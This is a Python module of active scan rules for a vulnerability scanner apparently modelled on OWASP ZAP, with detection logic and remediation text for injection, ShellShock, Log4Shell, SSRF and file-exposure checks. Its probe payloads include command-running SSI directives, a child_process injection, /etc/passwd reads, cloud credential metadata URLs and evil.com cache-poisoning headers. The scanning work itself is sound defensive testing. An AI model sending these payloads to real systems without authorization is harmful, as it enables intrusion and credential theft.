"""
BRAHMASTRA - Extra Active Scan Rules
=====================================
New active rules with payloads extracted from ZAP's source code.
Each rule sends test payloads and analyzes responses for vulnerability indicators.
"""

from __future__ import annotations
import re
import random
from brahmastra.narayanastra.rules import Rule, _text_similarity


# ═══════════════════════════════════════════════════════════════════════════════
# 1. Remote File Include (ZAP: RemoteFileIncludeScanRule, WASC-5, CWE-98)
# ═══════════════════════════════════════════════════════════════════════════════

class RemoteFileIncludeRule(Rule):
    """
    Detect Remote File Inclusion via include() with external URLs.
    Uses ZAP's approach: inject known public URL, check for its content in response.
    """
    _GOOGLE_TITLE = re.compile(r'<title>Google</title>', re.I)

    def __init__(self):
        super().__init__(
            id="rfi", name="Remote File Inclusion",
            severity="HIGH", cvss=8.5, category="injection",
            payloads=[
                "http://www.google.com/",
                "https://www.google.com/",
                "http://www.google.com/search?q=BRAHMASTRA",
                "\x00http://www.google.com/",   # null byte prefix
                "\x00https://www.google.com/",
            ],
            locations=["query", "body"],
            remediation="Never include files based on user input. Use allowlists for file paths.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Anti-FP: Skip if Google title was already in baseline
        if self._GOOGLE_TITLE.search(baseline_body or ""):
            return 0.0

        if self._GOOGLE_TITLE.search(response_body or ""):
            return 0.90
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 2. Code Injection (ZAP: CodeInjectionScanRule, WASC-20, CWE-94)
# ═══════════════════════════════════════════════════════════════════════════════

class CodeInjectionRule(Rule):
    """
    Detect PHP/ASP code injection via eval() or similar functions.
    PHP: Inject print(token), check if token appears in response.
    ASP: Inject math expression, check if product appears.
    """
    PHP_TOKEN = "brahmastra_code_rce"
    _ASP_A = random.randint(100000, 999999)
    _ASP_B = random.randint(100000, 999999)
    _ASP_PRODUCT = str(_ASP_A * _ASP_B)

    def __init__(self):
        super().__init__(
            id="code_injection", name="Server-Side Code Injection",
            severity="CRITICAL", cvss=9.8, category="injection",
            payloads=[
                # PHP payloads (ZAP pattern)
                f'";print("{self.PHP_TOKEN}");$var="',
                f"';print('{self.PHP_TOKEN}');$var='",
                f'${{@print("{self.PHP_TOKEN}")}}',
                f';print("{self.PHP_TOKEN}");',
                # ASP payloads (random math for anti-FP)
                f'"+response.write({self._ASP_A}*{self._ASP_B})+"',
                f"'+response.write({self._ASP_A}*{self._ASP_B})+'",
                f'response.write({self._ASP_A}*{self._ASP_B})',
                # Node.js
                f"require('child_process').execSync('echo {self.PHP_TOKEN}')",
            ],
            locations=["query", "body", "json"],
            remediation="Never use eval() or similar functions with user input. Use sandboxed execution.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # PHP token detection
        if self.PHP_TOKEN in body and self.PHP_TOKEN not in (baseline_body or ""):
            return 0.95

        # ASP math product detection
        if self._ASP_PRODUCT in body and self._ASP_PRODUCT not in (baseline_body or ""):
            return 0.92

        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 3. Server Side Include (ZAP: ServerSideIncludeScanRule, WASC-35)
# ═══════════════════════════════════════════════════════════════════════════════

class ServerSideIncludeRule(Rule):
    """Detect SSI injection via Apache SSI directives."""
    def __init__(self):
        super().__init__(
            id="ssi", name="Server-Side Include Injection",
            severity="HIGH", cvss=8.0, category="injection",
            payloads=[
                '<!--#exec cmd="id"-->',
                '<!--#exec cmd="cat /etc/passwd"-->',
                '<!--#include virtual="/etc/passwd"-->',
                '<!--#echo var="DOCUMENT_ROOT"-->',
                '<!--#printenv -->',
            ],
            locations=["query", "body"],
            remediation="Disable SSI processing. If needed, sanitize user input in SSI-enabled pages.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # Command execution evidence
        if re.search(r'uid=\d+\(', body) and "uid=" not in (baseline_body or ""):
            return 0.95
        if re.search(r'root:.:0:0:', body) and "root:" not in (baseline_body or ""):
            return 0.95
        # Environment variable disclosure
        if "DOCUMENT_ROOT" in payload and re.search(r'/\w+/\w+/\w+', body):
            if _text_similarity(body, baseline_body or "") < 0.7:
                return 0.70
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 4. Forbidden Bypass (ZAP: ForbiddenBypassScanRule, CWE-348)
# ═══════════════════════════════════════════════════════════════════════════════

class ForbiddenBypassRule(Rule):
    """
    Test 403 Forbidden bypass techniques.
    Only fires on endpoints that returned 403 in baseline.
    Uses header injection and path manipulation (from ZAP).
    """
    def __init__(self):
        super().__init__(
            id="forbidden_bypass", name="403 Forbidden Bypass",
            severity="HIGH", cvss=7.5, category="config",
            payloads=[
                # Header-based bypasses (injected as headers)
                "X-Original-URL: /",
                "X-Rewrite-URL: /",
                "X-Forwarded-For: 127.0.0.1",
                "X-Custom-IP-Authorization: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                # Path-based bypasses (injected as path suffix)
                "/.", "..;/", "%20", "%09", "?", "#", "/*",
                "/./", "//",
            ],
            locations=["header", "path_suffix"],
            remediation="Fix access control at the application level, not just the web server. Use consistent URL normalization.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Only relevant when baseline was 403
        if baseline_status != 403:
            return 0.0
        # Bypass successful: 403 → 200
        if status_code == 200 and len(response_body or "") > 100:
            return 0.90
        if status_code in (200, 301, 302) and status_code != baseline_status:
            return 0.70
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 5. Buffer Overflow (ZAP: BufferOverflowScanRule 30001)
# ═══════════════════════════════════════════════════════════════════════════════

class BufferOverflowRule(Rule):
    """Detect buffer overflow by sending very large input strings."""
    def __init__(self):
        super().__init__(
            id="buffer_overflow", name="Buffer Overflow (Large Input)",
            severity="MEDIUM", cvss=6.5, category="injection",
            payloads=[
                "A" * 5000,
                "A" * 10000,
                "A" * 20000,
            ],
            locations=["query", "body"],
            remediation="Implement input length validation. Use memory-safe languages/frameworks.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code >= 500 and baseline_status < 500:
            return 0.65
        if status_code == 0:  # Connection dropped
            return 0.80
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 6. Format String (ZAP: FormatStringScanRule 30002)
# ═══════════════════════════════════════════════════════════════════════════════

class FormatStringRule(Rule):
    """Detect format string vulnerabilities via %s/%x/%n specifiers."""
    _HEX_LEAK = re.compile(r'[0-9a-f]{8,}', re.I)

    def __init__(self):
        super().__init__(
            id="format_string", name="Format String Vulnerability",
            severity="HIGH", cvss=7.5, category="injection",
            payloads=[
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x",
                "%d%d%d%d%d%d%d%d",
                "%08x.%08x.%08x.%08x",
                "%n%n%n%n",  # Write specifier (dangerous)
            ],
            locations=["query", "body"],
            remediation="Never pass user input as format string argument. Use fixed format strings.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Crash/500 when format specifiers processed
        if status_code >= 500 and baseline_status < 500:
            return 0.70
        # Memory addresses leaked (hex values appearing)
        if "%x" in payload:
            hex_in_resp = self._HEX_LEAK.findall(response_body or "")
            hex_in_base = self._HEX_LEAK.findall(baseline_body or "")
            new_hex = set(hex_in_resp) - set(hex_in_base)
            if len(new_hex) >= 3:
                return 0.75
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 7. Integer Overflow (ZAP: IntegerOverflowScanRule 30003)
# ═══════════════════════════════════════════════════════════════════════════════

class IntegerOverflowRule(Rule):
    """Detect integer overflow by sending extreme numeric values."""
    def __init__(self):
        super().__init__(
            id="integer_overflow", name="Integer Overflow",
            severity="MEDIUM", cvss=5.3, category="injection",
            payloads=[
                "2147483647",    # INT_MAX (32-bit)
                "2147483648",    # INT_MAX + 1
                "-2147483649",   # INT_MIN - 1
                "4294967295",    # UINT_MAX
                "4294967296",    # UINT_MAX + 1
                "9999999999999999999",  # Very large
                "-1",            # Negative for unsigned
                "0",             # Zero
            ],
            locations=["query", "body", "json"],
            remediation="Validate numeric input ranges. Use appropriate integer types. Handle overflow errors.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code >= 500 and baseline_status < 500:
            return 0.60
        # Different response for overflow values
        sim = _text_similarity(response_body or "", baseline_body or "", payload)
        if sim < 0.5 and status_code != baseline_status:
            return 0.50
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 8. GET for POST (ZAP: GetForPostScanRule 10058)
# ═══════════════════════════════════════════════════════════════════════════════

class GetForPostRule(Rule):
    """Detect if POST endpoints accept GET requests (enables CSRF via GET)."""
    def __init__(self):
        super().__init__(
            id="get_for_post", name="POST Endpoint Accepts GET",
            severity="MEDIUM", cvss=4.7, category="config",
            payloads=[""],  # Empty - the engine switches method
            locations=["query"],
            remediation="Enforce HTTP method restrictions. POST endpoints should reject GET requests for state changes.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # If baseline was POST 200 and GET also returns 200 with similar content
        if status_code == 200 and baseline_status == 200:
            sim = _text_similarity(response_body or "", baseline_body or "")
            if sim > 0.80:
                return 0.60  # Same response via GET = accepts both methods
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 9. Source Code Disclosure (ZAP: SourceCodeDisclosure 41/42/43)
# ═══════════════════════════════════════════════════════════════════════════════

class SourceCodeDisclosureRule(Rule):
    """Detect exposed source control files (.git, .svn) and framework configs."""
    _GIT_PATTERN = re.compile(r'ref:\s*refs/heads/\w+')
    _SVN_PATTERN = re.compile(r'<wc-entries|svn:wc:')
    _WEBINF_PATTERN = re.compile(r'<web-app|<servlet|<filter')

    def __init__(self):
        super().__init__(
            id="source_code_disclosure", name="Source Code / Config Disclosure",
            severity="HIGH", cvss=7.5, category="info",
            payloads=[
                ".git/config",
                ".git/HEAD",
                ".git/index",
                ".svn/entries",
                ".svn/wc.db",
                "WEB-INF/web.xml",
                "WEB-INF/classes/",
                ".DS_Store",
                ".idea/workspace.xml",
                ".vscode/settings.json",
            ],
            locations=["path_suffix"],
            remediation="Block access to .git/, .svn/, WEB-INF/ in web server config. Add to .gitignore.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        if response_body == baseline_body:
            return 0.0
        body = response_body or ""

        # .git detection
        if ".git" in payload:
            if self._GIT_PATTERN.search(body):
                return 0.95
            if "[core]" in body or "[remote" in body:
                return 0.90

        # .svn detection
        if ".svn" in payload and self._SVN_PATTERN.search(body):
            return 0.90

        # WEB-INF detection
        if "WEB-INF" in payload and self._WEBINF_PATTERN.search(body):
            return 0.90

        # IDE config files
        if any(ide in payload for ide in [".idea", ".vscode", ".DS_Store"]):
            ct = (response_headers or {}).get("content-type", "")
            if "json" in ct or "xml" in ct or "octet" in ct:
                return 0.80

        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 10. HTTP Parameter Pollution (ZAP: HttpParameterPollutionScanRule 20014)
# ═══════════════════════════════════════════════════════════════════════════════

class HTTPParamPollutionRule(Rule):
    """Detect parameter pollution by sending duplicate parameters."""
    def __init__(self):
        super().__init__(
            id="hpp", name="HTTP Parameter Pollution",
            severity="MEDIUM", cvss=5.3, category="injection",
            payloads=[
                "BRAHMASTRA_HPP_A",
                "BRAHMASTRA_HPP_B",
            ],
            locations=["query"],
            remediation="Use consistent parameter parsing. Don't rely on first/last parameter value.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # If our HPP marker appears differently than expected
        if payload in body and payload not in (baseline_body or ""):
            sim = _text_similarity(body, baseline_body or "", payload)
            if sim < 0.8:
                return 0.55
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 11. Web Cache Deception (ZAP Beta: WebCacheDeceptionScanRule)
# ═══════════════════════════════════════════════════════════════════════════════

class WebCacheDeceptionRule(Rule):
    """Detect web cache deception by appending static file extensions to dynamic URLs."""
    def __init__(self):
        super().__init__(
            id="cache_deception", name="Web Cache Deception",
            severity="HIGH", cvss=7.5, category="config",
            payloads=[".css", ".js", ".png", ".ico", ".svg", ".woff2"],
            locations=["path_suffix"],
            remediation="Configure cache to respect Vary header and Content-Type. Don't cache by URL extension.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        headers = response_headers or {}
        # Check if response is cached despite being dynamic content
        cache_ctrl = headers.get("cache-control", "").lower()
        if "public" in cache_ctrl or ("max-age" in cache_ctrl and "no-store" not in cache_ctrl):
            # Response was cached AND content matches the dynamic page
            sim = _text_similarity(response_body or "", baseline_body or "", payload)
            if sim > 0.80:
                return 0.75  # Dynamic content served with cache headers
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 12. Environment File Exposure (ZAP: EnvFileScanRule)
# ═══════════════════════════════════════════════════════════════════════════════

class EnvFileExposureRule(Rule):
    """Detect exposed .env files containing secrets."""
    _ENV_PATTERN = re.compile(
        r'(?:DB_PASSWORD|DB_HOST|SECRET_KEY|APP_KEY|API_KEY|AWS_ACCESS'
        r'|MAIL_PASSWORD|JWT_SECRET|ENCRYPTION_KEY|DATABASE_URL)\s*=',
        re.I
    )

    def __init__(self):
        super().__init__(
            id="env_exposure", name="Environment File Exposed (.env)",
            severity="CRITICAL", cvss=9.0, category="info",
            payloads=[
                ".env", ".env.local", ".env.production", ".env.staging",
                ".env.development", ".env.backup", ".env.bak",
                ".env.example",  # Lower severity but still info
            ],
            locations=["path_suffix"],
            remediation="Block .env files in web server config. Never deploy .env to production web root.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        if response_body == baseline_body:
            return 0.0
        body = response_body or ""

        if self._ENV_PATTERN.search(body):
            return 0.95  # Definitely an .env file with secrets

        # Key=value format detection (generic .env)
        kv_lines = re.findall(r'^[A-Z_]+=.+', body, re.MULTILINE)
        if len(kv_lines) >= 3:
            return 0.80

        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 13. ShellShock (ZAP: ShellShockScanRule 10048, CVE-2014-6271)
# ═══════════════════════════════════════════════════════════════════════════════

class ShellShockRule(Rule):
    """
    Detect Bash ShellShock (CVE-2014-6271) via malicious function definitions
    in HTTP headers (User-Agent, Referer, Cookie).
    """
    _MARKER = "brahmastra_shellshock_" + str(random.randint(100000, 999999))

    def __init__(self):
        super().__init__(
            id="shellshock", name="ShellShock (CVE-2014-6271)",
            severity="CRITICAL", cvss=9.8, category="injection",
            payloads=[
                f'() {{ :;}}; echo "{self._MARKER}"',
                f'() {{ :;}}; /bin/echo "{self._MARKER}"',
                f'() {{ :;}}; echo Content-Type: text/plain; echo; echo "{self._MARKER}"',
                f'() {{ :;}}; /usr/bin/id',
            ],
            locations=["header"],
            remediation="Update Bash to a patched version. Never pass HTTP headers to shell environments.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        if self._MARKER in body and self._MARKER not in (baseline_body or ""):
            return 0.95
        if re.search(r'uid=\d+\(\w+\)', body) and "uid=" not in (baseline_body or ""):
            return 0.92
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 14. Log4Shell (ZAP: Log4ShellScanRule 40043, CVE-2021-44228)
# ═══════════════════════════════════════════════════════════════════════════════

class Log4ShellRule(Rule):
    """
    Detect Log4j JNDI injection (CVE-2021-44228).
    Injects ${jndi:...} payloads in params and headers.
    Detection: error messages, class loading indicators, or timing.
    """
    _ERROR_PATTERNS = re.compile(
        r'(?:JndiLookup|InitialContext|javax\.naming'
        r'|log4j|JNDI|NamingException|LdapURL'
        r'|Error looking up JNDI|JMSAppender)', re.I
    )

    def __init__(self):
        super().__init__(
            id="log4shell", name="Log4Shell (CVE-2021-44228)",
            severity="CRITICAL", cvss=10.0, category="injection",
            payloads=[
                "${jndi:ldap://localhost/brahmastra_test}",
                "${jndi:ldap://127.0.0.1/brahmastra_test}",
                "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://localhost/t}",
                "${jndi:rmi://localhost/brahmastra_test}",
                "${jndi:dns://localhost/brahmastra_test}",
            ],
            locations=["query", "body", "header", "json"],
            remediation="Upgrade Log4j to >= 2.17.1. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # JNDI error messages
        if self._ERROR_PATTERNS.search(body) and not self._ERROR_PATTERNS.search(baseline_body or ""):
            return 0.85
        # Server error on JNDI payload (connection attempt)
        if status_code >= 500 and baseline_status < 500:
            return 0.60
        # Significant timing difference (JNDI lookup causing delay)
        if elapsed > 8.0 and payload:
            return 0.50
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 15. Spring4Shell (ZAP: Spring4ShellScanRule 40045, CVE-2022-22965)
# ═══════════════════════════════════════════════════════════════════════════════

class Spring4ShellRule(Rule):
    """
    Detect Spring Framework RCE (CVE-2022-22965).
    Targets class loader manipulation via form data binding.
    """
    def __init__(self):
        super().__init__(
            id="spring4shell", name="Spring4Shell (CVE-2022-22965)",
            severity="CRITICAL", cvss=9.8, category="injection",
            payloads=[
                "class.module.classLoader.DefaultAssertionStatus=true",
                "class.module.classLoader.URLs%5B0%5D=0",
                "class.module.classLoader.resources.context.configFile=https://localhost/test",
            ],
            locations=["query", "body"],
            remediation="Upgrade Spring Framework to >= 5.3.18 / 5.2.20. Upgrade to JDK 9+ with DataBinder restrictions.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # Class loader manipulation evidence
        if status_code == 200 and "DefaultAssertionStatus" in payload:
            sim = _text_similarity(body, baseline_body or "", payload)
            if sim < 0.7:
                return 0.60  # Response changed significantly
        # Server error on class loader payload
        if status_code >= 500 and baseline_status < 500:
            if re.search(r'(?:ClassLoader|BeanWrapper|DataBinder|PropertyAccessor)', body, re.I):
                return 0.75
            return 0.50
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 16. Cloud Metadata Exposure (ZAP: CloudMetadataScanRule 90034)
# ═══════════════════════════════════════════════════════════════════════════════

class CloudMetadataRule(Rule):
    """
    Detect cloud metadata endpoint exposure via SSRF.
    Tests AWS IMDSv1, GCP, Azure, DigitalOcean metadata endpoints.
    """
    _METADATA_PATTERNS = re.compile(
        r'(?:ami-[a-f0-9]+|i-[a-f0-9]+|arn:aws'
        r'|compute\.googleapis\.com|accounts/service_accounts'
        r'|169\.254\.169\.254|metadata\.google\.internal'
        r'|azEnvironment|compute/identity'
        r'|droplet_id|region|interfaces/private)',
        re.I
    )

    def __init__(self):
        super().__init__(
            id="cloud_metadata", name="Cloud Metadata Exposure",
            severity="HIGH", cvss=8.5, category="injection",
            payloads=[
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/v1.json",
            ],
            locations=["query", "body"],
            remediation="Block requests to metadata IPs (169.254.169.254). Use IMDSv2 (requires token). Use network policies.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        if status_code != 200:
            return 0.0
        # Skip if metadata patterns were in baseline (not caused by injection)
        if self._METADATA_PATTERNS.search(baseline_body or ""):
            return 0.0
        if self._METADATA_PATTERNS.search(body):
            return 0.90
        # Check for IAM role names, instance IDs
        if re.search(r'"[A-Z][a-z]+[A-Z]\w+".*?"[a-zA-Z0-9/+=]+"', body):
            return 0.65  # Possible credential JSON
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 17. LDAP Injection (ZAP: LdapInjectionScanRule 40015)
# ═══════════════════════════════════════════════════════════════════════════════

class LDAPInjectionRule(Rule):
    """
    Detect LDAP injection by injecting LDAP filter syntax.
    Detection: LDAP error messages or unexpected data disclosure.
    """
    _LDAP_ERRORS = re.compile(
        r'(?:javax\.naming|LDAPException|ldap_search|Invalid DN syntax'
        r'|Bad search filter|LDAP error|NamingException'
        r'|error.*ldap|invalid.*filter|ldap.*invalid)',
        re.I
    )

    def __init__(self):
        super().__init__(
            id="ldap_injection", name="LDAP Injection",
            severity="HIGH", cvss=7.5, category="injection",
            payloads=[
                "*)(uid=*))(|(uid=*",
                "*)(|(objectclass=*)",
                "*()|%26'",
                "*)(cn=*))%00",
                "admin)(&)",
                "admin)(|(password=*))",
            ],
            locations=["query", "body"],
            remediation="Escape LDAP special characters (* \\ ( ) NUL). Use parameterized LDAP queries.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # LDAP error messages
        if self._LDAP_ERRORS.search(body) and not self._LDAP_ERRORS.search(baseline_body or ""):
            return 0.85
        # Server error on LDAP payload
        if status_code >= 500 and baseline_status < 500:
            return 0.55
        # Response significantly different (data leakage via wildcard filter)
        if status_code == 200 and baseline_status == 200 and "*" in payload:
            sim = _text_similarity(body, baseline_body or "", payload)
            if sim < 0.5 and len(body) > len(baseline_body or "") * 1.5:
                return 0.65  # More data returned (wildcard expanded)
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 18. Padding Oracle (ZAP: PaddingOracleScanRule 90024)
# ═══════════════════════════════════════════════════════════════════════════════

class PaddingOracleRule(Rule):
    """
    Detect padding oracle by modifying encrypted tokens.
    Different error responses for bad padding vs bad data = oracle exists.
    """
    def __init__(self):
        super().__init__(
            id="padding_oracle", name="Padding Oracle",
            severity="HIGH", cvss=7.5, category="crypto",
            payloads=[
                # Flip bits in last block (triggers bad padding)
                "AAAAAAAAAAAAAAAA",
                "AAAAAAAAAAAAAAAB",
                # Truncate token (triggers different error)
                "AAAA",
            ],
            locations=["query", "body"],
            remediation="Use authenticated encryption (AES-GCM). Switch to HMAC-verified tokens (JWT). Ensure error messages are identical for all decryption failures.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # Padding-specific error messages
        padding_errors = re.search(
            r'(?:padding|PKCS|InvalidCiphertext|BadPaddingException'
            r'|System\.Security\.Cryptography'
            r'|Invalid padding|decryption failed|MAC validation)',
            body, re.I
        )
        if padding_errors and not re.search(r'padding', baseline_body or "", re.I):
            return 0.85
        # Different error codes for different bad values = oracle
        if status_code in (400, 500) and baseline_status == 200:
            return 0.45  # Encrypted param accepted normally, rejected now
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 19. Hidden Files Finder (ZAP: HiddenFilesScanRule 40035)
# ═══════════════════════════════════════════════════════════════════════════════

class HiddenFilesRule(Rule):
    """Discover hidden/sensitive files that should not be web-accessible."""
    _HTPASSWD = re.compile(r'^[a-zA-Z0-9._-]+:\{?\$?\w*\}?[\w./+=$]+', re.MULTILINE)
    _NPMRC = re.compile(r'(?://registry\.npmjs\.org/|_authToken|//npm\.)', re.I)
    _DOCKERENV = re.compile(r'^(?:HOSTNAME=|PATH=|HOME=)', re.MULTILINE)

    def __init__(self):
        super().__init__(
            id="hidden_files", name="Hidden Files Finder",
            severity="MEDIUM", cvss=5.3, category="info",
            payloads=[
                ".htpasswd", ".htaccess",
                ".npmrc", ".yarnrc",
                ".dockerenv",
                "WEB-INF/web.xml",
                "META-INF/MANIFEST.MF",
                "crossdomain.xml",
                "clientaccesspolicy.xml",
                "robots.txt",
                "security.txt", ".well-known/security.txt",
                "sitemap.xml",
            ],
            locations=["path_suffix"],
            remediation="Block access to hidden files (.ht*, .npmrc, etc.) in web server config. Remove sensitive files from web root.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        if response_body == baseline_body:
            return 0.0
        body = response_body or ""

        if ".htpasswd" in payload and self._HTPASSWD.search(body):
            return 0.95
        if ".npmrc" in payload and self._NPMRC.search(body):
            return 0.90
        if ".dockerenv" in payload and self._DOCKERENV.search(body):
            return 0.80
        if "WEB-INF" in payload and re.search(r'<web-app|<servlet', body, re.I):
            return 0.90
        if "META-INF" in payload and re.search(r'Manifest-Version|Main-Class', body, re.I):
            return 0.85
        if "crossdomain.xml" in payload and "<cross-domain-policy" in body:
            return 0.70
        if "robots.txt" in payload and re.search(r'(?:Disallow|Allow|User-agent):', body, re.I):
            return 0.50  # Low confidence — robots.txt is expected
        if "security.txt" in payload and re.search(r'Contact:', body, re.I):
            return 0.30  # Expected file, not really a vulnerability
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 20. .NET Trace.axd (ZAP: TraceAxdScanRule 40029)
# ═══════════════════════════════════════════════════════════════════════════════

class TraceAxdRule(Rule):
    """Detect exposed .NET trace.axd debugging page."""
    def __init__(self):
        super().__init__(
            id="trace_axd", name=".NET Trace.axd Disclosure",
            severity="HIGH", cvss=7.5, category="info",
            payloads=["trace.axd", "Trace.axd", "elmah.axd"],
            locations=["path_suffix"],
            remediation="Disable tracing in web.config: <trace enabled='false'/>. Block .axd in production.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        body = response_body or ""
        if "Application Trace" in body or "Request Details" in body:
            return 0.92
        if "elmah" in payload.lower() and re.search(r'Error Log|Exception Details|ELMAH', body, re.I):
            return 0.90
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 21. .htaccess Accessible (ZAP: HtAccessScanRule 40032)
# ═══════════════════════════════════════════════════════════════════════════════

class HtAccessRule(Rule):
    """Detect exposed .htaccess files revealing server configuration."""
    _HTACCESS_PATTERN = re.compile(
        r'(?:RewriteRule|RewriteCond|RewriteEngine'
        r'|AuthType|AuthUserFile|Require\s+valid-user'
        r'|Order\s+(?:Allow|Deny)|SetEnv|AddHandler'
        r'|Options\s+(?:\+|-)?Indexes)', re.I
    )

    def __init__(self):
        super().__init__(
            id="htaccess", name=".htaccess Accessible",
            severity="MEDIUM", cvss=5.3, category="info",
            payloads=[".htaccess"],
            locations=["path_suffix"],
            remediation="Configure web server to deny access to .htaccess files. Apache: <Files .htaccess> Deny from all </Files>.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        body = response_body or ""
        if self._HTACCESS_PATTERN.search(body):
            return 0.90
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 22. User-Agent Fuzzer (ZAP: UserAgentScanRule 10104)
# ═══════════════════════════════════════════════════════════════════════════════

class UserAgentFuzzerRule(Rule):
    """Detect if application responds differently based on User-Agent (potential cloaking/bypass)."""
    def __init__(self):
        super().__init__(
            id="user_agent_fuzzer", name="User-Agent Dependent Response",
            severity="LOW", cvss=3.1, category="info",
            payloads=[
                "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "curl/7.68.0",
                "python-requests/2.28.0",
            ],
            locations=["header"],
            remediation="Serve consistent content regardless of User-Agent. Check if crawler-specific content differs from user content.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != baseline_status:
            return 0.55  # Different status for different UA
        body = response_body or ""
        sim = _text_similarity(body, baseline_body or "", payload)
        if sim < 0.6 and len(body) > 100:
            return 0.50  # Significantly different content per UA
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 23. Relative Path Confusion (ZAP: RelativePathConfusionScanRule 10051)
# ═══════════════════════════════════════════════════════════════════════════════

class RelativePathConfusionRule(Rule):
    """
    Detect Relative Path Overwrite (RPO) attacks.
    Append path segments to confuse relative URL resolution.
    """
    def __init__(self):
        super().__init__(
            id="relative_path_confusion", name="Relative Path Overwrite/Confusion",
            severity="MEDIUM", cvss=5.3, category="config",
            payloads=[
                "/..%2f..%2f..%2f..%2f..%2f",
                "/brahmastra_rpo_test",
                "/%2e%2e/%2e%2e/",
            ],
            locations=["path_suffix"],
            remediation="Use absolute URLs for all resources. Set base tag. Configure strict URL normalization.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code != 200:
            return 0.0
        body = response_body or ""
        baseline = baseline_body or ""
        # Check if page is served with same content but different base path
        # (would cause relative CSS/JS to load from wrong location)
        sim = _text_similarity(body, baseline, payload)
        if sim > 0.90 and len(body) > 200:
            # Same page served at different path — RPO possible
            ct = (response_headers or {}).get("content-type", "").lower()
            if "html" in ct:
                # Check if page uses relative paths
                if re.search(r'(?:src|href)=["\'](?!https?://|//|/)[^"\']+', body, re.I):
                    return 0.60
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# 24. Web Cache Poisoning (ZAP: CachePoisoningScanRule 40039)
# ═══════════════════════════════════════════════════════════════════════════════

class CachePoisoningRule(Rule):
    """
    Detect web cache poisoning via unkeyed headers.
    Inject unique values in X-Forwarded-Host/X-Original-URL and check if reflected.
    """
    _MARKER = "brahmastra-cache-" + str(random.randint(100000, 999999))

    def __init__(self):
        super().__init__(
            id="cache_poisoning", name="Web Cache Poisoning",
            severity="HIGH", cvss=7.5, category="config",
            payloads=[
                f"X-Forwarded-Host: {self._MARKER}.evil.com",
                f"X-Original-URL: /{self._MARKER}",
                f"X-Forwarded-Scheme: nothttps",
                f"X-Host: {self._MARKER}.evil.com",
            ],
            locations=["header"],
            remediation="Vary on all headers used in response. Don't trust X-Forwarded-* headers without validation. Use cache keys that include relevant headers.",
        )

